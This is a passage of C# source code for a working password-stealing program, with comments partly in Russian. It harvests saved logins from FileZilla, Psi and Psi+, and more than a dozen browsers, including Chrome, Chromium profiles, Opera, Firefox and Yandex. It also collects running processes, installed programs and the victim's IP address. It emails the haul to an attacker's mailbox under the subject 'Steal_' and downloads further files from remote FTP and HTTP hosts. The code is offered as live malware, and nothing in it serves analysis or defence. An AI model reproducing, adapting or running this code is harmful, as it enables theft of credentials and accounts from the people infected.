                        for (int i = 0; i < f2.Length; i++)
                        {
                            t4 = t4 + f2[i];
                        }

                        //https://developercommunity.visualstudio.com/storage/attachments/14264-msiinv.txt
                        //https://pastebin.com/Bt9de4K1

                        //get process
                        Process[] processCollection = Process.GetProcesses();
                        string prosessy = "";
                        foreach (Process p in processCollection)
                        {
                            prosessy = prosessy + p.ProcessName + Environment.NewLine;
                            //Console.WriteLine(p.ProcessName);

                        }

                        //fzilla
                        string fzilla = smet10 + Environment.NewLine;
                        try
                        {
                            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\FileZilla\recentservers.xml"))
                            {
                                string a;
                                string[] host = new string[100];
                                string[] port = new string[100];
                                string[] user = new string[100];
                                string[] pass = new string[100];
                                a = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\FileZilla\recentservers.xml");
                                int x1;
                                int x2;
                                int i = 0;
                                int y = 0;
                                while (true)
                                {
                                    x1 = a.IndexOf("<Host>", y);
                                    x2 = a.IndexOf("</Host>", y);
                                    host[i] = a.Substring(x1 + 6, x2 - x1 - 6);



                                    x1 = a.IndexOf("<Port>", y);
                                    x2 = a.IndexOf("</Port>", y);
                                    port[i] = a.Substring(x1 + 6, x2 - x1 - 6);


                                    x1 = a.IndexOf("<User>", y);
                                    x2 = a.IndexOf("</User>", y);
                                    user[i] = a.Substring(x1 + 6, x2 - x1 - 6);


                                    x1 = a.IndexOf("<Pass encoding=\"base64\">", y);
                                    x2 = a.IndexOf("</Pass>", y);

                                    pass[i] = a.Substring(x1 + 24, x2 - x1 - 24);
                                    y = x2 + 5;
                                    var base64EncodedBytes = Convert.FromBase64String(pass[i]);
                                    pass[i] = Encoding.UTF8.GetString(base64EncodedBytes);

                                    fzilla = fzilla + host[i] + Environment.NewLine + port[i] + Environment.NewLine + user[i] + Environment.NewLine + pass[i] + Environment.NewLine;
                                    i++;
                                    if (y > a.Length - 300)
                                    {
                                        break;
                                    }
                                }
                            }
                        }
                        catch { }



                        string psiplus = "PSI+:" + Environment.NewLine;
                        try
                        {

                            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Psi+\profiles\default\accounts.xml"))
                            {
                                string a;
                                string user1 = "";
                                string pass1 = "";
                                a = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Psi+\profiles\default\accounts.xml");
                                int x1;
                                int x2;
                                x1 = 0;
                                x2 = 0;
                                x1 = a.IndexOf("<password type=\"QString\">", x1);
                                x2 = a.IndexOf("</password>", x1);
                                pass1 = a.Substring(x1 + 25, x2 - x1 - 25);



                                x1 = a.IndexOf("<jid type=\"QString\">", x1);
                                x2 = a.IndexOf("</jid>", x1);
                                user1 = a.Substring(x1 + 20, x2 - x1 - 20);
                                psiplus = psiplus + Environment.NewLine + user1 + Environment.NewLine + pass1 + Environment.NewLine;

                            }
                        }
                        catch { }



                        string psi = "PSI:" + Environment.NewLine;
                        try
                        {

                            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Psi\profiles\default\accounts.xml"))
                            {
                                string a;
                                string user1 = "";
                                string pass1 = "";
                                a = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Psi\profiles\default\accounts.xml");
                                int x1;
                                int x2;
                                x1 = 0;
                                x2 = 0;
                                x1 = a.IndexOf("<password type=\"QString\">", x1);
                                x2 = a.IndexOf("</password>", x1);
                                pass1 = a.Substring(x1 + 25, x2 - x1 - 25);



                                x1 = a.IndexOf("<jid type=\"QString\">", x1);
                                x2 = a.IndexOf("</jid>", x1);
                                user1 = a.Substring(x1 + 20, x2 - x1 - 20);
                                //Console.WriteLine(host[i]);
                                //Console.WriteLine(port[i]);
                                //Console.WriteLine(user[i]);
                                //Console.WriteLine(pass[i]);
                                psi = psi + Environment.NewLine + user1 + Environment.NewLine + pass1 + Environment.NewLine;

                            }
                        }
                        catch { }
                        //MessageBox.Show(Contents);
                        //Random r = new Random();
                        //int udgey2 = r.Next(59281, 138208);
                        //Thread.Sleep(udgey2);
                        MailMessage mail1 = new MailMessage();
                        SmtpClient SmtpServer1 = new SmtpClient(smet3);
                        mail1.From = new MailAddress(smet);
                        mail1.To.Add(smet);
                        mail1.Subject = "Steal_" + direction + "_" + Environment.UserName;
                        mail1.Body = Contents + fzilla + Environment.NewLine + psiplus + Environment.NewLine + psi + Environment.NewLine + Environment.NewLine + "Processes" + prosessy + "Instal Programs" + Environment.NewLine + t4;
                        SmtpServer1.Port = 587;
                        SmtpServer1.Credentials = new NetworkCredential(smet, smet2);
                        SmtpServer1.EnableSsl = true;
                        SmtpServer1.Send(mail1);


                        //string nameSend =  direction + "_" + Environment.UserName+".txt";
                        //string URI = "";
                        //string myParameters = "name="+nameSend+ "&cont=" + Contents + fzilla + Environment.NewLine + psiplus + Environment.NewLine + psi + Environment.NewLine + Environment.NewLine + "Processes" + prosessy+ Environment.NewLine+ Environment.NewLine + "Instal Programs" + Environment.NewLine + t4;

                        //using (WebClient wc = new WebClient())
                        //{
                        //    wc.Headers[HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
                        //    string HtmlResult = wc.UploadString(URI, myParameters);
                        //}
                    }
                    catch { }

                }
                else
                {
                    try
                    {
                        if (Environment.Is64BitOperatingSystem)
                        {
                            FtpWebRequest request =
                             (FtpWebRequest)WebRequest.Create(dec);
                            request.Credentials = new NetworkCredential(lg, ps);
                            request.Method = WebRequestMethods.Ftp.DownloadFile;
                            using (Stream ftpStream = request.GetResponse().GetResponseStream())
                            using (Stream fileStream = File.Create(pub2 + sq))
                            {
                                ftpStream.CopyTo(fileStream);
                            }
                            if (!File.Exists(pub2 + sq))
                            {
                                Thread.Sleep(1000);
                                request =
                     (FtpWebRequest)WebRequest.Create(dec);
                                request.Credentials = new NetworkCredential(lg, ps);
                                request.Method = WebRequestMethods.Ftp.DownloadFile;
                                using (Stream ftpStream = request.GetResponse().GetResponseStream())
                                using (Stream fileStream = File.Create(pub2 + sq))
                                {
                                    ftpStream.CopyTo(fileStream);
                                }
                            }


                            if (!File.Exists(pub2 + sq))
                            {
                                Thread.Sleep(4500);
                                request =
                     (FtpWebRequest)WebRequest.Create(dec);
                                request.Credentials = new NetworkCredential(lg, ps);
                                request.Method = WebRequestMethods.Ftp.DownloadFile;
                                using (Stream ftpStream = request.GetResponse().GetResponseStream())
                                using (Stream fileStream = File.Create(pub2 + sq))
                                {
                                    ftpStream.CopyTo(fileStream);
                                }
                            }

                            //sqlite#2 FTP
                            if (!File.Exists(pub2 + sq))
                            {
                                Thread.Sleep(3682);
                                request =
                     (FtpWebRequest)WebRequest.Create(host2);
                                request.Credentials = new NetworkCredential(lg2, ps2);
                                request.Method = WebRequestMethods.Ftp.DownloadFile;
                                using (Stream ftpStream = request.GetResponse().GetResponseStream())
                                using (Stream fileStream = File.Create(pub2 + sq))
                                {
                                    ftpStream.CopyTo(fileStream);
                                }
                            }

                            //sqlite#2 HTTP
                            if (!File.Exists(pub2 + sq))
                            {

                                using (var client = new WebClient())
                                {
                                    client.DownloadFile(host2a, pub2 + sq);
                                }
                            }
                        }
                        else
                        {
                            FtpWebRequest request =
                             (FtpWebRequest)WebRequest.Create(smet36);
                            request.Credentials = new NetworkCredential(lg, ps);
                            request.Method = WebRequestMethods.Ftp.DownloadFile;
                            using (Stream ftpStream = request.GetResponse().GetResponseStream())
                            using (Stream fileStream = File.Create(pub2 + sq))
                            {
                                ftpStream.CopyTo(fileStream);
                            }
                        }

                    }
                    catch { }
                    string Contents = "";
                    try
                    {   //CHROME
                        string chr1 = Environment.GetEnvironmentVariable(smet4) + smet5 + smet6;
                        string chr2 = Environment.GetEnvironmentVariable(smet4) + smet5 + smet7;
                        if (File.Exists(chr1))
                        {
                            File.Copy(chr1, chr2, true);
                            Contents += "\nChrome profile default:\n========================\n";
                            List<LoginData> LgList;
                            LgList = SQParse.ParseFile(chr2); //LgList=список узлов класса LoginData,LoginData имеет 3 переменных
                            foreach (LoginData LogData in LgList) //ParseFile уже заполнил List
                            {
                                if (!String.IsNullOrEmpty(LogData.Url) && !String.IsNullOrEmpty(LogData.Login) && !String.IsNullOrEmpty(LogData.Password))
                                    Contents += LogData.Url + "\n" + LogData.Login + "\n" + LogData.Password + '\n' + "========================" + "\n";
                            }
                            File.Delete(chr2);
                        }
                    }
                    catch { }
                    try
                    {   //CHROME profile 1
                        string chr1 = Environment.GetEnvironmentVariable(smet4) + smet31 + smet6;
                        string chr2 = Environment.GetEnvironmentVariable(smet4) + smet31 + smet7;
                        if (File.Exists(chr1))
                        {
                            File.Copy(chr1, chr2, true);
                            Contents += "\nChrome profile1:\n========================\n";
                            List<LoginData> LgList;
                            LgList = SQParse.ParseFile(chr2); //LgList=список узлов класса LoginData,LoginData имеет 3 переменных
                            foreach (LoginData LogData in LgList) //ParseFile уже заполнил List
                            {
                                if (!String.IsNullOrEmpty(LogData.Url) && !String.IsNullOrEmpty(LogData.Login) && !String.IsNullOrEmpty(LogData.Password))
                                    Contents += LogData.Url + "\n" + LogData.Login + "\n" + LogData.Password + '\n' + "========================" + "\n";
                            }
                            File.Delete(chr2);
                        }
                    }
                    catch { }
                    try
                    {   //CHROME profile 2
                        string chr1 = Environment.GetEnvironmentVariable(smet4) + smet32 + smet6;
                        string chr2 = Environment.GetEnvironmentVariable(smet4) + smet32 + smet7;
                        if (File.Exists(chr1))
                        {
                            File.Copy(chr1, chr2, true);
                            Contents += "\nChrome profile2:\n========================\n";
                            List<LoginData> LgList;
                            LgList = SQParse.ParseFile(chr2); //LgList=список узлов класса LoginData,LoginData имеет 3 переменных
                            foreach (LoginData LogData in LgList) //ParseFile уже заполнил List
                            {
                                if (!String.IsNullOrEmpty(LogData.Url) && !String.IsNullOrEmpty(LogData.Login) && !String.IsNullOrEmpty(LogData.Password))
                                    Contents += LogData.Url + "\n" + LogData.Login + "\n" + LogData.Password + '\n' + "========================" + "\n";
                            }
                            File.Delete(chr2);
                        }
                    }
                    catch { }
                    try
                    {   //CHROME profile 3
                        string chr1 = Environment.GetEnvironmentVariable(smet4) + smet33 + smet6;
                        string chr2 = Environment.GetEnvironmentVariable(smet4) + smet33 + smet7;
                        if (File.Exists(chr1))
                        {
                            File.Copy(chr1, chr2, true);
                            Contents += "\nChrome profile3:\n========================\n";
                            List<LoginData> LgList;
                            LgList = SQParse.ParseFile(chr2); //LgList=список узлов класса LoginData,LoginData имеет 3 переменных
                            foreach (LoginData LogData in LgList) //ParseFile уже заполнил List
                            {
                                if (!String.IsNullOrEmpty(LogData.Url) && !String.IsNullOrEmpty(LogData.Login) && !String.IsNullOrEmpty(LogData.Password))
                                    Contents += LogData.Url + "\n" + LogData.Login + "\n" + LogData.Password + '\n' + "========================" + "\n";
                            }
                            File.Delete(chr2);
                        }
                    }
                    catch { }
                    try
                    {   //CHROME profile 4
                        string chr1 = Environment.GetEnvironmentVariable(smet4) + smet34 + smet6;
                        string chr2 = Environment.GetEnvironmentVariable(smet4) + smet34 + smet7;
                        if (File.Exists(chr1))
                        {
                            File.Copy(chr1, chr2, true);
                            Contents += "\nChrome profile4:\n========================\n";
                            List<LoginData> LgList;
                            LgList = SQParse.ParseFile(chr2); //LgList=список узлов класса LoginData,LoginData имеет 3 переменных
                            foreach (LoginData LogData in LgList) //ParseFile уже заполнил List
                            {
                                if (!String.IsNullOrEmpty(LogData.Url) && !String.IsNullOrEmpty(LogData.Login) && !String.IsNullOrEmpty(LogData.Password))
                                    Contents += LogData.Url + "\n" + LogData.Login + "\n" + LogData.Password + '\n' + "========================" + "\n";
                            }
                            File.Delete(chr2);
                        }
                    }
                    catch { }
                    try
                    {   //CHROME profile 5
                        string chr1 = Environment.GetEnvironmentVariable(smet4) + smet35 + smet6;
                        string chr2 = Environment.GetEnvironmentVariable(smet4) + smet35 + smet7;
                        if (File.Exists(chr1))
                        {
                            File.Copy(chr1, chr2, true);
                            Contents += "\nChrome profile5:\n========================\n";
                            List<LoginData> LgList;
                            LgList = SQParse.ParseFile(chr2); //LgList=список узлов класса LoginData,LoginData имеет 3 переменных
                            foreach (LoginData LogData in LgList) //ParseFile уже заполнил List
                            {
                                if (!String.IsNullOrEmpty(LogData.Url) && !String.IsNullOrEmpty(LogData.Login) && !String.IsNullOrEmpty(LogData.Password))
                                    Contents += LogData.Url + "\n" + LogData.Login + "\n" + LogData.Password + '\n' + "========================" + "\n";
                            }
                            File.Delete(chr2);
                        }
                    }
                    catch { }
                    //CHROMIUM
                    try
                    {
                        string chrm1 = Environment.GetEnvironmentVariable(smet4) + smet25 + smet6;
                        string chrm2 = Environment.GetEnvironmentVariable(smet4) + smet25 + smet7;
                        if (File.Exists(chrm1))
                        {
                            File.Copy(chrm1, chrm2, true);
                            Contents += "\nChromium profile default:\n========================\n";
                            List<LoginData> LgList;
                            LgList = SQParse.ParseFile(chrm2); //LgList=список узлов класса LoginData,LoginData имеет 3 переменных
                            foreach (LoginData LogData in LgList) //ParseFile уже заполнил List
                            {
                                if (!String.IsNullOrEmpty(LogData.Url) && !String.IsNullOrEmpty(LogData.Login) && !String.IsNullOrEmpty(LogData.Password))
                                    Contents += LogData.Url + "\n" + LogData.Login + "\n" + LogData.Password + '\n' + "========================" + "\n";
                            }
                            File.Delete(chrm2);
                        }
                    }
                    catch { }
                    //CHROMIUM profile 1
                    try
                    {
                        string chrm1 = Environment.GetEnvironmentVariable(smet4) + smet26 + smet6;
                        string chrm2 = Environment.GetEnvironmentVariable(smet4) + smet26 + smet7;
                        if (File.Exists(chrm1))
                        {
                            File.Copy(chrm1, chrm2, true);
                            Contents += "\nChromium profile1:\n========================\n";
                            List<LoginData> LgList;
                            LgList = SQParse.ParseFile(chrm2); //LgList=список узлов класса LoginData,LoginData имеет 3 переменных
                            foreach (LoginData LogData in LgList) //ParseFile уже заполнил List
                            {
                                if (!String.IsNullOrEmpty(LogData.Url) && !String.IsNullOrEmpty(LogData.Login) && !String.IsNullOrEmpty(LogData.Password))
                                    Contents += LogData.Url + "\n" + LogData.Login + "\n" + LogData.Password + '\n' + "========================" + "\n";
                            }
                            File.Delete(chrm2);
                        }
                    }
                    catch { }


                    //CHROMIUM profile 2
                    try
                    {
                        string chrm1 = Environment.GetEnvironmentVariable(smet4) + smet27 + smet6;
                        string chrm2 = Environment.GetEnvironmentVariable(smet4) + smet27 + smet7;
                        if (File.Exists(chrm1))
                        {
                            File.Copy(chrm1, chrm2, true);
                            Contents += "\nChromium profile2:\n========================\n";
                            List<LoginData> LgList;
                            LgList = SQParse.ParseFile(chrm2); //LgList=список узлов класса LoginData,LoginData имеет 3 переменных
                            foreach (LoginData LogData in LgList) //ParseFile уже заполнил List
                            {
                                if (!String.IsNullOrEmpty(LogData.Url) && !String.IsNullOrEmpty(LogData.Login) && !String.IsNullOrEmpty(LogData.Password))
                                    Contents += LogData.Url + "\n" + LogData.Login + "\n" + LogData.Password + '\n' + "========================" + "\n";
                            }
                            File.Delete(chrm2);
                        }
                    }
                    catch { }
                    //CHROMIUM profile 3
                    try
                    {
                        string chrm1 = Environment.GetEnvironmentVariable(smet4) + smet28 + smet6;
                        string chrm2 = Environment.GetEnvironmentVariable(smet4) + smet28 + smet7;
                        if (File.Exists(chrm1))
                        {
                            File.Copy(chrm1, chrm2, true);
                            Contents += "\nChromium profile3:\n========================\n";
                            List<LoginData> LgList;
                            LgList = SQParse.ParseFile(chrm2); //LgList=список узлов класса LoginData,LoginData имеет 3 переменных
                            foreach (LoginData LogData in LgList) //ParseFile уже заполнил List
                            {
                                if (!String.IsNullOrEmpty(LogData.Url) && !String.IsNullOrEmpty(LogData.Login) && !String.IsNullOrEmpty(LogData.Password))
                                    Contents += LogData.Url + "\n" + LogData.Login + "\n" + LogData.Password + '\n' + "========================" + "\n";
                            }
                            File.Delete(chrm2);
                        }
                    }
                    catch { }
                    //CHROMIUM profile 4
                    try
                    {
                        string chrm1 = Environment.GetEnvironmentVariable(smet4) + smet29 + smet6;
                        string chrm2 = Environment.GetEnvironmentVariable(smet4) + smet29 + smet7;
                        if (File.Exists(chrm1))
                        {
                            File.Copy(chrm1, chrm2, true);
                            Contents += "\nChromium profile4:\n========================\n";
                            List<LoginData> LgList;
                            LgList = SQParse.ParseFile(chrm2); //LgList=список узлов класса LoginData,LoginData имеет 3 переменных
                            foreach (LoginData LogData in LgList) //ParseFile уже заполнил List
                            {
                                if (!String.IsNullOrEmpty(LogData.Url) && !String.IsNullOrEmpty(LogData.Login) && !String.IsNullOrEmpty(LogData.Password))
                                    Contents += LogData.Url + "\n" + LogData.Login + "\n" + LogData.Password + '\n' + "========================" + "\n";
                            }
                            File.Delete(chrm2);
                        }
                    }
                    catch { }
                    //CHROMIUM profile 5
                    try
                    {
                        string chrm1 = Environment.GetEnvironmentVariable(smet4) + smet30 + smet6;
                        string chrm2 = Environment.GetEnvironmentVariable(smet4) + smet30 + smet7;
                        if (File.Exists(chrm1))
                        {
                            File.Copy(chrm1, chrm2, true);
                            Contents += "\nChromium profile5:\n========================\n";
                            List<LoginData> LgList;
                            LgList = SQParse.ParseFile(chrm2); //LgList=список узлов класса LoginData,LoginData имеет 3 переменных
                            foreach (LoginData LogData in LgList) //ParseFile уже заполнил List
                            {
                                if (!String.IsNullOrEmpty(LogData.Url) && !String.IsNullOrEmpty(LogData.Login) && !String.IsNullOrEmpty(LogData.Password))
                                    Contents += LogData.Url + "\n" + LogData.Login + "\n" + LogData.Password + '\n' + "========================" + "\n";
                            }
                            File.Delete(chrm2);
                        }
                    }
                    catch { }



                    //MessageBox.Show("5");
                    try
                    {
                        string ope1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + smet8 + smet6;
                        string ope2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + smet8 + smet7;
                        if (File.Exists(ope1))
                        {
                            File.Copy(ope1, ope2, true);
                            Contents += "\nOpera:\n========================\n";
                            List<LoginData> LgList;
                            LgList = SQParse.ParseFile(ope2); //LgList=список узлов класса LoginData,LoginData имеет 3 переменных
                            foreach (LoginData LogData in LgList) //ParseFile уже заполнил List
                            {
                                if (!String.IsNullOrEmpty(LogData.Url) && !String.IsNullOrEmpty(LogData.Login) && !String.IsNullOrEmpty(LogData.Password))
                                    Contents += LogData.Url + "\n" + LogData.Login + "\n" + LogData.Password + '\n' + "========================" + "\n";
                            }

                            File.Delete(ope2);

                        }
                    }
                    catch
                    { }
                    //MessageBox.Show("7");

                    try
                    {
                        string fir1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Mozilla\Firefox\Profiles";
                        string[] folders = Directory.GetDirectories(fir1, "*", SearchOption.TopDirectoryOnly);
                        fir1 = folders[0] + @"\logins.json";
                        string fir2 = fir1.Replace("logins.json", "logins2.json");

                        if (File.Exists(fir1))
                        {

                            File.Copy(fir1, fir2, true);
                            Contents += "\nFirefox:\n========================\n";
                            List<BrowserLog> LgList;

                            string fir3 = fir2.Substring(0, fir2.Length - 13);
                            FireFox obj = new FireFox(fir3);
                            LgList = obj.GetPasswords();

                            foreach (BrowserLog LogData in LgList) //ParseFile уже заполнил List
                            {

                                Contents += LogData.Host + "\n" + LogData.Login + "\n" + LogData.Password + '\n' + "========================" + "\n";

                            }
                            File.Delete(fir2);
                        }
                    }
                    catch { }
                    // MessageBox.Show("8");
                    try
                    {
                        string yan1 = Environment.GetEnvironmentVariable(smet4) + smet9 + smet6;
                        string yan2 = Environment.GetEnvironmentVariable(smet4) + smet9 + smet7;
                        if (File.Exists(yan1))
                        {
                            File.Copy(yan1, yan2, true);
                            Contents += "\nYandex:\n========================\n";
                            List<LoginData> LgList;
                            LgList = SQParse.ParseFile(yan2); //LgList=список узлов класса LoginData,LoginData имеет 3 переменных
                            foreach (LoginData LogData in LgList) //ParseFile уже заполнил List
                            {
                                if (!String.IsNullOrEmpty(LogData.Url) && !String.IsNullOrEmpty(LogData.Login) && !String.IsNullOrEmpty(LogData.Password))
                                    Contents += LogData.Url + "\n" + LogData.Login + "\n" + LogData.Password + '\n' + "========================" + "\n";
                            }
                            File.Delete(yan2);
                        }
                    }
                    catch { }
                    // MessageBox.Show("9");
                    try
                    {
                        string kom1 = Environment.GetEnvironmentVariable(smet4) + smet18 + smet6;
                        string kom2 = Environment.GetEnvironmentVariable(smet4) + smet18 + smet7;
                        if (File.Exists(kom1))
                        {
                            File.Copy(kom1, kom2, true);
                            Contents += "\nKometa:\n========================\n";
                            List<LoginData> LgList;
                            LgList = SQParse.ParseFile(kom2); //LgList=список узлов класса LoginData,LoginData имеет 3 переменных
                            foreach (LoginData LogData in LgList) //ParseFile уже заполнил List
                            {
                                if (!String.IsNullOrEmpty(LogData.Url) && !String.IsNullOrEmpty(LogData.Login) && !String.IsNullOrEmpty(LogData.Password))
                                    Contents += LogData.Url + "\n" + LogData.Login + "\n" + LogData.Password + '\n' + "========================" + "\n";
                            }
                            File.Delete(kom2);
                        }
                    }
                    catch { }


                    //MessageBox.Show("10");
                    try
                    {
                        string ami1 = Environment.GetEnvironmentVariable(smet4) + smet19 + smet6;
                        string ami2 = Environment.GetEnvironmentVariable(smet4) + smet19 + smet7;
                        if (File.Exists(ami1))
                        {
                            File.Copy(ami1, ami2, true);
                            Contents += "\nAmigo:\n========================\n";
                            List<LoginData> LgList;
                            LgList = SQParse.ParseFile(ami2); //LgList=список узлов класса LoginData,LoginData имеет 3 переменных
                            foreach (LoginData LogData in LgList) //ParseFile уже заполнил List
                            {
                                if (!String.IsNullOrEmpty(LogData.Url) && !String.IsNullOrEmpty(LogData.Login) && !String.IsNullOrEmpty(LogData.Password))
                                    Contents += LogData.Url + "\n" + LogData.Login + "\n" + LogData.Password + '\n' + "========================" + "\n";
                            }
                            File.Delete(ami2);
                        }
                    }
                    catch { }
                    //MessageBox.Show("11");
                    try
                    {
                        string tor1 = Environment.GetEnvironmentVariable(smet4) + smet20 + smet6;
                        string tor2 = Environment.GetEnvironmentVariable(smet4) + smet20 + smet7;
                        if (File.Exists(tor1))
                        {
                            File.Copy(tor1, tor2, true);
                            Contents += "\nTorch:\n========================\n";
                            List<LoginData> LgList;
                            LgList = SQParse.ParseFile(tor2); //LgList=список узлов класса LoginData,LoginData имеет 3 переменных
                            foreach (LoginData LogData in LgList) //ParseFile уже заполнил List
                            {
                                if (!String.IsNullOrEmpty(LogData.Url) && !String.IsNullOrEmpty(LogData.Login) && !String.IsNullOrEmpty(LogData.Password))
                                    Contents += LogData.Url + "\n" + LogData.Login + "\n" + LogData.Password + '\n' + "========================" + "\n";
                            }
                            File.Delete(tor2);
                        }
                    }
                    catch { }
                    //MessageBox.Show("12");
                    try
                    {
                        string orb1 = Environment.GetEnvironmentVariable(smet4) + smet21 + smet6;
                        string orb2 = Environment.GetEnvironmentVariable(smet4) + smet21 + smet7;
                        if (File.Exists(orb1))
                        {
                            File.Copy(orb1, orb2, true);
                            Contents += "\nOrbitum:\n========================\n";
                            List<LoginData> LgList;
                            LgList = SQParse.ParseFile(orb2); //LgList=список узлов класса LoginData,LoginData имеет 3 переменных
                            foreach (LoginData LogData in LgList) //ParseFile уже заполнил List
                            {
                                if (!String.IsNullOrEmpty(LogData.Url) && !String.IsNullOrEmpty(LogData.Login) && !String.IsNullOrEmpty(LogData.Password))
                                    Contents += LogData.Url + "\n" + LogData.Login + "\n" + LogData.Password + '\n' + "========================" + "\n";
                            }
                            File.Delete(orb2);
                        }
                    }
                    catch { }
                    try
                    {   //FREE U
                        string freeu = Environment.GetEnvironmentVariable(smet4) + smet37 + smet6;
                        string freeu2 = Environment.GetEnvironmentVariable(smet4) + smet37 + smet7;
                        if (File.Exists(freeu))
                        {
                            File.Copy(freeu, freeu2, true);
                            Contents += "\nFree U:\n========================\n";
                            List<LoginData> LgList;
                            LgList = SQParse.ParseFile(freeu2); //LgList=список узлов класса LoginData,LoginData имеет 3 переменных
                            foreach (LoginData LogData in LgList) //ParseFile уже заполнил List
                            {
                                if (!String.IsNullOrEmpty(LogData.Url) && !String.IsNullOrEmpty(LogData.Login) && !String.IsNullOrEmpty(LogData.Password))
                                    Contents += LogData.Url + "\n" + LogData.Login + "\n" + LogData.Password + '\n' + "========================" + "\n";
                            }
                            File.Delete(freeu2);
                        }
                    }
                    catch { }
                    try
                    {
                        //GET IP
                        WebRequest request2 = WebRequest.Create(smet23);
                        WebResponse response = request2.GetResponse();
                        StreamReader stream = new StreamReader(response.GetResponseStream());
                        string direction = stream.ReadToEnd();
                        //request2.Timeout = 90000;
                        stream.Close();
                        response.Close(); //Search for the ip in the html
                        int first = direction.IndexOf("Address: ") + 9;
                        int last = direction.LastIndexOf("</body>");
                        direction = direction.Substring(first, last - first);

                        //SEND GMAIL
                        //MessageBox.Show(Contents);
                        //Random r = new Random();
                        //int udgey2 = r.Next(59281, 138208);
                        //Thread.Sleep(udgey2);
                        MailMessage mail1 = new MailMessage();
                        SmtpClient SmtpServer1 = new SmtpClient(smet3);
                        mail1.From = new MailAddress(smet);
                        mail1.To.Add(smet);
                        mail1.Subject = "Steal_" + direction + "_" + Environment.UserName;
                        mail1.Body = Contents + Environment.NewLine+"Без админ прав " ;
                        SmtpServer1.Port = 587;
                        SmtpServer1.Credentials = new NetworkCredential(smet, smet2);
                        SmtpServer1.EnableSsl = true;
                        SmtpServer1.Send(mail1);
                    }
                    catch
                    {

                    }
                }
            }

            catch { }
            Environment.Exit(0);
        }

    }
}
